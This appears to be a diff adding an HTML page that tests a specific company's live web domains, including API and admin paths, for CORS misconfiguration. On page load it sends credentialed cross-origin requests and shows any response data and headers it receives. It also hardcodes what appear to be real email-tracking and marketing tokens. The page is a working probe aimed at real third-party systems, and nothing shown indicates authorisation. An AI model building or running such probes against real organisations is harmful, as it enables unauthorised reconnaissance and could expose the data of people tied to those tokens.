@@ -1,0 +1,104 @@
+<!-- Save as cors_test.html and serve from different domains -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Vulnerability Test - Kaseya</title>
+</head>
+<body>
+    <h1>🔍 CORS Testing for Kaseya Email Tracking</h1>
+    <div id="results"></div>
+
+    <script>
+        const TRACKING_TOKEN = "NTk2LUlOWC03MDQAAAGdOIJjD0q9V0hM1iDh9v9kFoDpumYRSxVgXWDPA2eN2wlTCg7KEW4z06GYZjLX566ot9UCFdw=";
+        const EMAIL_TOKEN = "NTk2LUlOWC03MDQAAAGdOJRNhxtBPmbzTrg_IaWkmIYOII4ie9j24REZD8V3NZ53Yp4LezpJ1scXD3QQ5oirkYxn1Srt2UveaMRvju9s4hxlUKVlFcIm1KQ";
+        const MKT_TOKEN = "NTk2LUlOWC03MDQAAAGdOIJjDyzhEQDX9jJxw6wabUlJhiPkHw9sqNjzCEMDvcEqXg4gjHL0sY0lh_8XLoE2dRXHVCJjBjgtQf0RQB9SfePKZ6Rk77NO1uTuyVFCy-bV46fF9g";
+
+        const urls = [
+            `https://go.kaseya.com/v/${TRACKING_TOKEN}`,
+            `https://info.kaseya.com/index.php/email/emailWebview?mkt_tok=${MKT_TOKEN}&email=${EMAIL_TOKEN}`,
+            `https://info.kaseya.com/api/`,
+            `https://go.kaseya.com/api/`,
+            `https://info.kaseya.com/admin/`,
+        ];
+
+        function testCORS(url) {
+            return new Promise((resolve) => {
+                const xhr = new XMLHttpRequest();
+                
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4) {
+                        if (xhr.status === 200) {
+                            resolve({
+                                url: url,
+                                status: 'SUCCESS',
+                                data: xhr.responseText.substring(0, 500),
+                                headers: xhr.getAllResponseHeaders()
+                            });
+                        } else {
+                            resolve({
+                                url: url,
+                                status: 'FAILED',
+                                statusCode: xhr.status,
+                                error: xhr.statusText
+                            });
+                        }
+                    }
+                };
+                
+                xhr.onerror = function() {
+                    resolve({
+                        url: url,
+                        status: 'CORS_BLOCKED',
+                        error: 'CORS policy blocked the request'
+                    });
+                };
+                
+                try {
+                    xhr.open('GET', url, true);
+                    xhr.withCredentials = true;  // Test with credentials
+                    xhr.send();
+                } catch (e) {
+                    resolve({
+                        url: url,
+                        status: 'ERROR',
+                        error: e.message
+                    });
+                }
+            });
+        }
+
+        async function runTests() {
+            const resultsDiv = document.getElementById('results');
+            resultsDiv.innerHTML = '<h2>🔍 Testing CORS vulnerabilities...</h2>';
+
+            for (const url of urls) {
+                const result = await testCORS(url);
+                
+                let resultHTML = `
+                    <div style="border: 1px solid #ccc; margin: 10px; padding: 10px;">
+                        <h3>URL: ${result.url}</h3>
+                        <p><strong>Status:</strong> ${result.status}</p>
+                `;
+
+                if (result.status === 'SUCCESS') {
+                    resultHTML += `
+                        <p style="color: red;"><strong>🚨 CORS VULNERABILITY FOUND!</strong></p>
+                        <p><strong>Response Data:</strong></p>
+                        <pre style="background: #f0f0f0; padding: 10px;">${result.data}</pre>
+                        <p><strong>Response Headers:</strong></p>
+                        <pre style="background: #f0f0f0; padding: 10px;">${result.headers}</pre>
+                    `;
+                } else {
+                    resultHTML += `<p><strong>Error:</strong> ${result.error || 'No error details'}</p>`;
+                }
+
+                resultHTML += '</div>';
+                resultsDiv.innerHTML += resultHTML;
+            }
+        }
+
+        // Start testing when page loads
+        window.onload = runTests;
+    </script>
+</body>
+</html>
